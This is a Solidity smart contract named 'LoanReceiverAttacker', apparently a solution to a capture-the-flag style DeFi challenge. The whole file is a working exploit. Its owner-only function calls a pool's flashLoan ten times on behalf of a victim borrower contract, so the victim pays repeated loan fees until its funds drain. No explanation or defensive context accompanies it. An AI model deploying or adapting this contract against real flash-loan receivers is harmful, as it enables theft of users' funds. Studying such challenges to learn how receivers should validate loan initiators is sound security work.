// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

interface IPool {
  function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

contract LoanReceiverAttacker {
  address _owner;
  IERC3156FlashBorrower _receiver;
  IPool _pool;
  address _token;

  constructor(IERC3156FlashBorrower receiver, IPool pool, address token) {
    _owner = msg.sender;
    _receiver = receiver;
    _pool = pool;
    _token = token;
  }

  function attackReceiver() public {
    require(msg.sender == _owner, "only owner");

    for (uint8 i; i < 10; ++i) {
      _pool.flashLoan(_receiver, _token, 1 ether, "0x");
    }
  }
}
